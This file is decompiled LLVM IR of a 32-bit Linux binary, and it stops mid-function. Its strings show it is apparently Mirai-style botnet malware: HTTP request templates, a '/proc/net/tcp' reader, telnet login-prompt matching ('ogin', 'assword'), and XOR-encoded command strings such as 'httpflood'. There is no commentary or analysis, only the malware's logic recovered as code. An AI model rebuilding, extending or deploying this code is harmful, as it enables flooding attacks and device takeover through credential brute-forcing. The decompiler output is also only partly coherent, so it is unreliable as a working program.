source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8056050.2 = global i32 0
@global_var_8056068.3 = local_unnamed_addr global i32* @global_var_8056050.2
@global_var_8054394.5 = constant [4 x i8] c"GET\00"
@global_var_805436d.6 = constant i32 1210056751
@global_var_805439f.7 = constant i32 540737568
@global_var_805436f.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8054387.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_80543a6.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8054398.11 = constant [9 x i8] c"Cookie: \00"
@global_var_80543a1.12 = constant [3 x i8] c"; \00"
@global_var_80543a4.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_80543a9.14 = constant i32 1952972859
@global_var_80543ab.15 = constant [5 x i8] c"http\00"
@global_var_80543ba.16 = constant i32 -1623588825
@global_var_80543b0.17 = constant [5 x i8] c"url=\00"
@global_var_80543b5.18 = constant [5 x i8] c"POST\00"
@global_var_80543b3.19 = constant i32 1330643005
@global_var_80543d0.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_80561c4.21 = local_unnamed_addr global i32 0
@global_var_80561c0.22 = local_unnamed_addr global i32 0
@global_var_8056140.23 = local_unnamed_addr global i32 0
@global_var_8056074.24 = local_unnamed_addr global i32 134551376
@global_var_80561cc.25 = local_unnamed_addr global i32 0
@global_var_80561ca.26 = local_unnamed_addr global i32 0
@global_var_805606c.27 = local_unnamed_addr global i32 -1
@global_var_80561bc.29 = local_unnamed_addr global i32 0
@global_var_8056148.30 = local_unnamed_addr global i32 0
@global_var_8056154.31 = local_unnamed_addr global i32 0
@global_var_805614c.32 = local_unnamed_addr global i32 0
@global_var_8056150.33 = local_unnamed_addr global i32 0
@global_var_8056190.34 = local_unnamed_addr global i32 0
@global_var_805616a.35 = local_unnamed_addr global i32 0
@global_var_8056170.36 = local_unnamed_addr global i32 0
@global_var_8056160.37 = global i32 0
@global_var_8056178.39 = local_unnamed_addr global i32 0
@global_var_8056174.40 = global i32 0
@global_var_8056184.41 = local_unnamed_addr global i32 0
@global_var_8056600.42 = local_unnamed_addr global i32 0
@global_var_8056164.43 = local_unnamed_addr global i32 0
@global_var_805616c.44 = local_unnamed_addr global i32 0
@global_var_80561e0.45 = local_unnamed_addr global i32 0
@global_var_8056200.46 = global i32 0
@global_var_8056158.47 = local_unnamed_addr global i32 0
@global_var_8056188.48 = local_unnamed_addr global i32 0
@global_var_805458e.49 = constant [5 x i8] c"ogin\00"
@global_var_8054593.50 = constant [6 x i8] c"enter\00"
@global_var_8054599.51 = constant [8 x i8] c"assword\00"
@global_var_8056620.52 = global i32 0
@global_var_80545d0.54 = constant [3 x i8] c"\225\00"
@global_var_8056640.55 = local_unnamed_addr global i32 0
@global_var_8056644.56 = local_unnamed_addr global i32 0
@global_var_80545d3.57 = constant i32 1308673945
@global_var_80566b8.58 = local_unnamed_addr global i32 0
@global_var_80566bc.59 = local_unnamed_addr global i32 0
@global_var_80545d6.60 = constant i32 1448168270
@global_var_8056630.61 = local_unnamed_addr global i32 0
@global_var_8056634.62 = local_unnamed_addr global i32 0
@global_var_80545e6.63 = constant i32 1381389898
@global_var_8056648.64 = local_unnamed_addr global i32 0
@global_var_805664c.65 = local_unnamed_addr global i32 0
@global_var_8054604.66 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_8056650.67 = local_unnamed_addr global i32 0
@global_var_8056654.68 = local_unnamed_addr global i32 0
@global_var_805460c.69 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_8056658.70 = local_unnamed_addr global i32 0
@global_var_805665c.71 = local_unnamed_addr global i32 0
@global_var_8054612.72 = constant i32 1195772418
@global_var_8056660.73 = local_unnamed_addr global i32 0
@global_var_8056664.74 = local_unnamed_addr global i32 0
@global_var_805461e.75 = constant [5 x i8] c"\0DDF\22\00"
@global_var_8056668.76 = local_unnamed_addr global i32 0
@global_var_805666c.77 = local_unnamed_addr global i32 0
@global_var_8054623.78 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_8056670.79 = local_unnamed_addr global i32 0
@global_var_8056674.80 = local_unnamed_addr global i32 0
@global_var_805462b.81 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_8056678.82 = local_unnamed_addr global i32 0
@global_var_805667c.83 = local_unnamed_addr global i32 0
@global_var_8054634.84 = constant i32 1836214128
@global_var_8056680.85 = local_unnamed_addr global i32 0
@global_var_8056684.86 = local_unnamed_addr global i32 0
@global_var_8054642.87 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_8056688.88 = local_unnamed_addr global i32 0
@global_var_805668c.89 = local_unnamed_addr global i32 0
@global_var_805464d.90 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_8056690.91 = local_unnamed_addr global i32 0
@global_var_8056694.92 = local_unnamed_addr global i32 0
@global_var_80547cc.93 = constant i32 437738110
@global_var_8056698.94 = local_unnamed_addr global i32 0
@global_var_805669c.95 = local_unnamed_addr global i32 0
@global_var_8054658.96 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_80566a0.97 = local_unnamed_addr global i32 0
@global_var_80566a4.98 = local_unnamed_addr global i32 0
@global_var_8054661.99 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_80566a8.100 = local_unnamed_addr global i32 0
@global_var_80566ac.101 = local_unnamed_addr global i32 0
@global_var_805466d.102 = constant [7 x i8] c"QJGNN\22\00"
@global_var_80566c0.103 = local_unnamed_addr global i32 0
@global_var_80566c4.104 = local_unnamed_addr global i32 0
@global_var_8054674.105 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_80566c8.106 = local_unnamed_addr global i32 0
@global_var_80566cc.107 = local_unnamed_addr global i32 0
@global_var_805467c.108 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_80566d0.109 = local_unnamed_addr global i32 0
@global_var_80566d4.110 = local_unnamed_addr global i32 0
@global_var_8054684.111 = constant [4 x i8] c"QJ\22\00"
@global_var_80566d8.112 = local_unnamed_addr global i32 0
@global_var_80566dc.113 = local_unnamed_addr global i32 0
@global_var_8054688.114 = constant i32 1280000013
@global_var_80566e0.115 = local_unnamed_addr global i32 0
@global_var_80566e4.116 = local_unnamed_addr global i32 0
@global_var_805469c.117 = constant i32 1668311919
@global_var_80566e8.118 = local_unnamed_addr global i32 0
@global_var_80566ec.119 = local_unnamed_addr global i32 0
@global_var_80546b5.120 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_80566f0.121 = local_unnamed_addr global i32 0
@global_var_80566f4.122 = local_unnamed_addr global i32 0
@global_var_80546bf.123 = constant i32 1280000013
@global_var_80566f8.124 = local_unnamed_addr global i32 0
@global_var_80566fc.125 = local_unnamed_addr global i32 0
@global_var_80546d0.126 = constant i32 1280000013
@global_var_8056700.127 = local_unnamed_addr global i32 0
@global_var_8056704.128 = local_unnamed_addr global i32 0
@global_var_80546e7.129 = constant i32 1464693110
@global_var_8056708.130 = local_unnamed_addr global i32 0
@global_var_805670c.131 = local_unnamed_addr global i32 0
@global_var_80546fd.132 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8056710.133 = local_unnamed_addr global i32 0
@global_var_8056714.134 = local_unnamed_addr global i32 0
@global_var_805470f.135 = constant i32 1196376908
@global_var_8056718.136 = local_unnamed_addr global i32 0
@global_var_805671c.137 = local_unnamed_addr global i32 0
@global_var_805471c.138 = constant i32 1280068961
@global_var_8056720.139 = local_unnamed_addr global i32 0
@global_var_8056724.140 = local_unnamed_addr global i32 0
@global_var_80547f0.141 = constant i32 1195458915
@global_var_8056728.142 = local_unnamed_addr global i32 0
@global_var_805672c.143 = local_unnamed_addr global i32 0
@global_var_8054844.144 = constant i32 1195458915
@global_var_8056730.145 = local_unnamed_addr global i32 0
@global_var_8056734.146 = local_unnamed_addr global i32 0
@global_var_8054868.147 = constant i32 1447841121
@global_var_8056738.148 = local_unnamed_addr global i32 0
@global_var_805673c.149 = local_unnamed_addr global i32 0
@global_var_8054734.150 = constant i32 1633044305
@global_var_8056740.151 = local_unnamed_addr global i32 0
@global_var_8056744.152 = local_unnamed_addr global i32 0
@global_var_8054741.153 = constant i32 1346651984
@global_var_8056748.154 = local_unnamed_addr global i32 0
@global_var_805674c.155 = local_unnamed_addr global i32 0
@global_var_805474b.156 = constant i32 1128353102
@global_var_8056750.157 = local_unnamed_addr global i32 0
@global_var_8056754.158 = local_unnamed_addr global i32 0
@global_var_8054756.159 = constant i32 257312593
@global_var_8056758.160 = local_unnamed_addr global i32 0
@global_var_805675c.161 = local_unnamed_addr global i32 0
@global_var_8054763.162 = constant i32 1447841089
@global_var_8056760.163 = local_unnamed_addr global i32 0
@global_var_8056764.164 = local_unnamed_addr global i32 0
@global_var_8054774.165 = constant i32 1279479894
@global_var_8056768.166 = local_unnamed_addr global i32 0
@global_var_805676c.167 = local_unnamed_addr global i32 0
@global_var_8054788.168 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8056770.169 = local_unnamed_addr global i32 0
@global_var_8056774.170 = local_unnamed_addr global i32 0
@global_var_8054728.171 = constant i32 1380403017
@global_var_8056778.172 = local_unnamed_addr global i32 0
@global_var_805677c.173 = local_unnamed_addr global i32 0
@global_var_8054791.174 = constant i32 1280068929
@global_var_8056780.175 = local_unnamed_addr global i32 0
@global_var_8056784.176 = local_unnamed_addr global i32 0
@global_var_805479e.177 = constant i32 1414547281
@global_var_8056788.178 = local_unnamed_addr global i32 0
@global_var_805678c.179 = local_unnamed_addr global i32 0
@global_var_80547b1.180 = constant i32 1414547281
@global_var_8056790.181 = local_unnamed_addr global i32 0
@global_var_8056794.182 = local_unnamed_addr global i32 0
@global_var_805489c.183 = constant i32 1264078191
@global_var_8056798.184 = local_unnamed_addr global i32 0
@global_var_805679c.185 = local_unnamed_addr global i32 0
@global_var_805490c.186 = constant i32 1264078191
@global_var_80567a0.187 = local_unnamed_addr global i32 0
@global_var_80567a4.188 = local_unnamed_addr global i32 0
@global_var_805497c.189 = constant i32 1264078191
@global_var_80567a8.190 = local_unnamed_addr global i32 0
@global_var_80567ac.191 = local_unnamed_addr global i32 0
@global_var_80549ec.192 = constant i32 1264078191
@global_var_80567b0.193 = local_unnamed_addr global i32 0
@global_var_80567b4.194 = local_unnamed_addr global i32 0
@global_var_8054a5c.195 = constant i32 1264078191
@global_var_80567b8.196 = local_unnamed_addr global i32 0
@global_var_80567bc.197 = local_unnamed_addr global i32 0
@global_var_80561b4.198 = global i32 0
@global_var_80567c0.199 = global i32 0
@global_var_8056080.200 = global i32 0
@global_var_805686c.202 = global i32 0
@global_var_8056870.203 = local_unnamed_addr global i32 0
@global_var_8056874.204 = global i32 0
@global_var_8056880.205 = local_unnamed_addr global i32 0
@global_var_8056b74.206 = global i32 0
@global_var_8056b9c.207 = local_unnamed_addr global i32 0
@global_var_8056b8c.208 = local_unnamed_addr global i32 0
@global_var_8056b90.209 = local_unnamed_addr global i32 0
@global_var_8056b94.210 = local_unnamed_addr global i32 0
@global_var_8056b98.211 = local_unnamed_addr global i32 0
@global_var_8056ba4.212 = local_unnamed_addr global i32 0
@global_var_8056bb0.213 = local_unnamed_addr global i32 0
@global_var_8056ba8.214 = local_unnamed_addr global i32 0
@global_var_8056bb4.215 = local_unnamed_addr global i32 0
@global_var_8056b88.216 = local_unnamed_addr global i32 0
@global_var_8056b84.218 = local_unnamed_addr global i32 0
@global_var_8056bac.219 = local_unnamed_addr global i32 0
@global_var_805687c.220 = local_unnamed_addr global i32 0
@global_var_8056098.221 = global i32 0
@global_var_8054e40.223 = constant i32 33554944
@global_var_80560cc.224 = local_unnamed_addr global i32* @global_var_8054e40.223
@global_var_80560b0.225 = global i32 0
@global_var_8056198.226 = local_unnamed_addr global i32 0
@global_var_8056044.228 = global i32 -1
@global_var_8053919.229 = constant i32 -294069
@global_var_80561a8.230 = local_unnamed_addr global i32 0
@global_var_80561ac.231 = local_unnamed_addr global i32 0
@global_var_8054d2c.232 = constant [10 x i8] c"/dev/null\00"
@global_var_80561a4.234 = local_unnamed_addr global i32 0
@global_var_805619c.235 = local_unnamed_addr global i32 0
@global_var_80561a0.236 = local_unnamed_addr global i32 0
@global_var_8054557.237 = constant i32 1346850560
@global_var_80560c8.238 = local_unnamed_addr global i32* @global_var_8054557.237
@global_var_8053aff.239 = constant i32 1928542531
@global_var_8053b23.240 = constant i32 1928542531
@global_var_80561b8.241 = local_unnamed_addr global i32 0
@global_var_8056bb8.242 = local_unnamed_addr global i32 0
@global_var_8056bbc.243 = local_unnamed_addr global i32 0
@global_var_80560e0.1 = local_unnamed_addr global i8 0
@global_var_8056078.28 = local_unnamed_addr global i8 1
@global_var_8056176.38 = local_unnamed_addr global i16 0
@global_var_805607c.53 = local_unnamed_addr global i16 -16657
@global_var_8056840.201 = global i8 0
@global_var_8056ba0.217 = local_unnamed_addr global i8 0
@global_var_8056194.222 = local_unnamed_addr global i8 0
@global_var_80561b0.233 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 57275
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8054320()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80560e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8056068.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8056068.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8056068.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80560e0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8056068.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80560e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134565952)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134570068 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_80539b5(i32 134538624, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134562630, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134562630, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134562630, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8054394.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp136 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp136, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_805436d.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805200a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp238 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_80514e0(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_80514e0(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_80514e0(i8* %tmp238)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5212 = call i32 @function_80514e0(i8* %tmp238)
  store i32 %v2_80482a5212, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4213 = icmp eq i32 %v2_80482a5212, 0
  store i1 %v12_80482b4213, i1* %zf.global-to-local, align 1
  %v7_80482b6214 = icmp sgt i32 %v2_80482a5212, 0
  br i1 %v7_80482b6214, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0217 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be216 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8215 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp238, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be216, %v4_80482a0217
